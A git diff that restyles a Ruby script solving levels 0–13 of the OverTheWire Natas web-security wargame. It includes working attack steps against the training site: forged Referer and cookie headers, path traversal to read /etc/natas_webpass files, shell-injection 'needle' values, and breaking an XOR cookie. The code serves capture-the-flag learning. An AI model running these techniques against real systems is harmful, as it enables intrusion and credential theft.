@@ -1,46 +1,55 @@
-require "net/http"
-require "base64"
-require "yaml"
-require "json"
+# frozen_string_literal: true
 
+require 'net/http'
+require 'base64'
+require 'yaml'
+require 'json'
+
+##
+# OverTheWire wargame Natas
 class Natas
-  MAXLEVEL  = 34
+  MAXLEVEL = 34
 
   attr_accessor :levels, :level
 
   def initialize(shell)
     @shell = shell
     @level = nil
-    @levels = Array.new
-    ObjectSpace.each_object(Class).select {|c| c < NatasLevelBase}.each {|c| @levels << c.new(@shell)}
-    @levels.sort! {|a, b| a.level <=> b.level}
+    @levels = []
+    ObjectSpace.each_object(Class).select { |c| c < NatasLevelBase }.each { |c| @levels << c.new(@shell) }
+    @levels.sort! { |a, b| a.level <=> b.level }
   end
 
   def exec
-    level = @levels.detect {|l| l.level == @level}
+    level = @levels.detect { |l| l.level == @level }
+
     raise StandardError, "Level #{@level} not implemented" if level.nil?
     raise StandardError, "Level #{@level} has no password" if level.password.nil?
+
     password = level.exec
-    level = @levels.detect {|l| l.level == @level + 1}
+    level = @levels.detect { |l| l.level == @level + 1 }
     return if level.nil?
+
     level.password = password
   end
 
   def to_yaml
-    data = Hash.new
+    data = {}
     @levels.each do |level|
       data[level.level] = level.password
     end
-    return YAML.dump(data)
+    YAML.dump(data)
   end
 end
 
+##
+# Base class of level
 class NatasLevelBase
-  HOST    = "natas.labs.overthewire.org"
-  PORT    = 80
-  LOGIN   = "natas"
-  WEBPASS = "/etc/natas_webpass"
-  LEVEL   = nil
+  HOST = 'natas.labs.overthewire.org'
+  PORT = 80
+  LOGIN = 'natas'
+  WEBPASS = '/etc/natas_webpass'
+  LEVEL = nil
 
   attr_reader :login
   attr_accessor :password
@@ -53,19 +62,23 @@ class NatasLevelBase
   end
 
   def exec; end
-  def level; self.class::LEVEL end
+
+  def level
+    self.class::LEVEL
+  end
 
   def get(query, headers = {}, data = nil)
-    headers.merge!({
-      "Authorization": "Basic " + Base64.strict_encode64("#{@login}:#{@password}")
-    })
-    if data.nil?
-      response = @client.get(query, headers)
-    else
-      response = @client.post(query, data, headers)
-    end
-    raise StandardError, "Unauthorized" if response.class == Net::HTTPForbidden
-    return response
+    headers.merge!(
+      {
+        'Authorization' => "Basic #{Base64.strict_encode64("#{@login}:#{@password}")}"
+      }
+    )
+
+    response = data.nil? ? @client.get(query, headers) : @client.post(query, data, headers)
+
+    raise StandardError, 'Unauthorized' if response.instance_of?(Net::HTTPForbidden)
+
+    response
   end
 
   private
@@ -75,19 +88,21 @@ class NatasLevelBase
   end
 
   def found(password)
-    log(@shell.console.green("Password found: ") + @shell.console.cyan.bold(password))
-    return password
+    log(@shell.console.green('Password found: ') + @shell.console.cyan.bold(password))
+    password
   end
 
   def not_found
-    raise StandardError, "Password not found"
+    raise StandardError, 'Password not found'
   end
 end
 
+##
+# Level 0
 class NatasLevel0 < NatasLevelBase
-  LEVEL       = 0
-  PASSWORD    = "natas0"
-  PAGE = "/"
+  LEVEL = 0
+  PASSWORD = 'natas0'
+  PAGE = '/'
 
   def initialize(*)
     super
@@ -96,113 +111,133 @@ class NatasLevel0 < NatasLevelBase
 
   def exec
     log("Parsing the page: #{PAGE}")
-    data = get("/").body
+    data = get('/').body
     match = /<!--The password for natas1 is (\w{32}) -->/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 1
 class NatasLevel1 < NatasLevelBase
   LEVEL = 1
-  PAGE = "/"
+  PAGE = '/'
 
   def exec
     log("Parsing the page: #{PAGE}")
     data = get(PAGE).body
     match = /<!--The password for natas2 is (\w{32}) -->/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 2
 class NatasLevel2 < NatasLevelBase
   LEVEL = 2
-  USERS_FILE = "/files/users.txt"
+  USERS_FILE = '/files/users.txt'
 
   def exec
     log("Parsing users file: #{USERS_FILE}")
     data = get(USERS_FILE).body
     match = /natas3:(\w{32})/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 3
 class NatasLevel3 < NatasLevelBase
   LEVEL = 3
-  USERS_FILE = "/s3cr3t/users.txt"
+  USERS_FILE = '/s3cr3t/users.txt'
 
   def exec
     log("Parsing secret users file: #{USERS_FILE}")
     data = get(USERS_FILE).body
     match = /natas4:(\w{32})/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 4
 class NatasLevel4 < NatasLevelBase
   LEVEL = 4
-  PAGE = "/"
+  PAGE = '/'
 
   def exec
     referer = URI::HTTP.build(
-      host: "natas5." + HOST,
-      path: "/",
+      host: "natas5.#{HOST}",
+      path: '/'
     )
 
-    log("Setting the Referer HTTP header: #{referer.to_s}")
+    log("Setting the Referer HTTP header: #{referer}")
     log("Parsing the page: #{PAGE}")
     data = get(
       PAGE,
-      {"Referer": referer.to_s},
+      {
+        'Referer' => referer.to_s
+      }
     ).body
 
     match = /The password for natas5 is (\w{32})/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 5
 class NatasLevel5 < NatasLevelBase
   LEVEL = 5
-  PAGE = "/"
+  PAGE = '/'
 
   def exec
-    cookie = "loggedin=1"
+    cookie = 'loggedin=1'
     log("Setting the Cookie HTTP header: #{cookie}")
 
     log("Parsing the page: #{PAGE}")
     data = get(
       PAGE,
-      {"Cookie": cookie},
+      {
+        'Cookie' => cookie
+      }
     ).body
 
     match = /The password for natas6 is (\w{32})/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 6
 class NatasLevel6 < NatasLevelBase
   LEVEL = 6
 
   def exec
-    data = get("/includes/secret.inc").body
+    data = get('/includes/secret.inc').body
     match = /\$secret = "(\w{19})";/.match(data)
     not_found unless match
-    data = URI.encode_www_form({
-      "submit": "",
-      "secret": match[1],
-    })
-    data = get("/", {}, data).body
+    data = URI.encode_www_form(
+      {
+        'submit' => '',
+        'secret' => match[1]
+      }
+    )
+    data = get('/', {}, data).body
     match = /The password for natas7 is (\w{32})/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 7
 class NatasLevel7 < NatasLevelBase
   LEVEL = 7
 
@@ -210,95 +245,107 @@ class NatasLevel7 < NatasLevelBase
     data = get("/?page=#{WEBPASS}/natas8").body
     match = /<br>\n(\w{32})\n\n<!--/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 8
 class NatasLevel8 < NatasLevelBase
   LEVEL = 8
 
   def exec
-    data = get("/index-source.html").body
+    data = get('/index-source.html').body
     match = /\$encodedSecret&nbsp;=&nbsp;"(\w{32})";/.match(data)
     not_found unless match
-    secret = Base64.decode64([match[1]].pack("H*").reverse)
+    secret = Base64.decode64([match[1]].pack('H*').reverse)
     data = get(
-      "/",
+      '/',
       {},
-      URI.encode_www_form({
-        "submit": "",
-        "secret": secret,
-      })
+      URI.encode_www_form(
+        {
+          'submit' => '',
+          'secret' => secret
+        }
+      )
     ).body
     match = /The password for natas9 is (\w{32})/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 9
 class NatasLevel9 < NatasLevelBase
   LEVEL = 9
 
   def exec
     data = get(
-      "/?" +
-      URI.encode_www_form({
-        "needle": "'' #{WEBPASS}/natas10;",
-      })
+      "/?#{URI.encode_www_form(
+        {
+          'needle' => "'' #{WEBPASS}/natas10;"
+        }
+      )}"
     ).body
-    match = /Output:\n<pre>\n(\w{32})\n<\/pre>/.match(data)
+    match = %r(Output:\n<pre>\n(\w{32})\n</pre>).match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 10
 class NatasLevel10 < NatasLevelBase
   LEVEL = 10
 
   def exec
     data = get(
-      "/?" +
-      URI.encode_www_form({
-        "needle": "'' -m 1 #{WEBPASS}/natas11",
-      })
+      "/?#{URI.encode_www_form(
+        {
+          'needle' => "'' -m 1 #{WEBPASS}/natas11"
+        }
+      )}"
     ).body
     match = /natas11:(\w{32})\n/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 11
 class NatasLevel11 < NatasLevelBase
   LEVEL = 11
-  PAGE = "/"
+  PAGE = '/'
   DEFAULT_DATA = {
-    "showpassword"  => "no",
-    "bgcolor"       => "#ffffff",
-  }
+    'showpassword'  => 'no',
+    'bgcolor'       => '#ffffff'
+  }.freeze
 
   def xor_encrypt(data, key)
     out = String.new
     data.chars.each_with_index do |c, i|
       out << (c.ord ^ key[i % key.length].ord).chr
     end
-    return out
+    out
   end
 
   def exec
     log("Getting the Cookie HTTP header from the page: #{PAGE}")
     response = get(PAGE)
-    cookie = response["Set-Cookie"]
-    data = cookie.split("=")[1]
+    cookie = response['Set-Cookie']
+    data = cookie.split('=')[1]
     data = URI.decode_www_form_component(data)
     log("Data: #{data}")
 
-    log("Searching the XOR encryption key")
+    log('Searching the XOR encryption key')
     key = xor_encrypt(
       Base64.strict_decode64(data),
-      JSON.generate(DEFAULT_DATA),
+      JSON.generate(DEFAULT_DATA)
     )
     log("Key found: #{key}")
-    log("Searching a pattern of the key")
+    log('Searching a pattern of the key')
     pattern = String.new
     key.chars.each_with_index do |c, i|
       pattern << c
@@ -307,33 +354,38 @@ class NatasLevel11 < NatasLevelBase
     log("Pattern found: #{pattern}")
     key = pattern
 
-    data = DEFAULT_DATA.clone
-    data["showpassword"] = "yes"
+    data = DEFAULT_DATA.dup
+    data['showpassword'] = 'yes'
     data = JSON.generate(data)
     log("Encrypting of new data: #{data}")
     data = xor_encrypt(
       data,
-      key,
+      key
     )
 
-    data = "data=" + Base64.strict_encode64(data)
+    data = "data=#{Base64.strict_encode64(data)}"
     log("Setting the new Cookie HTTP header: #{data}")
     log("Parsing the page: #{PAGE}")
     data = get(
       PAGE,
-      {"Cookie": data},
+      {
+        'Cookie' => data
+      }
     ).body
     match = /The password for natas12 is (\w{32})<br>/.match(data)
     not_found unless match
-    return found(match[1])
+    found(match[1])
   end
 end
 
+##
+# Level 12
 class NatasLevel12 < NatasLevelBase
   LEVEL = 12
 end
 
+##
+# Level 13
 class NatasLevel13 < NatasLevelBase
   LEVEL = 13
 end
-
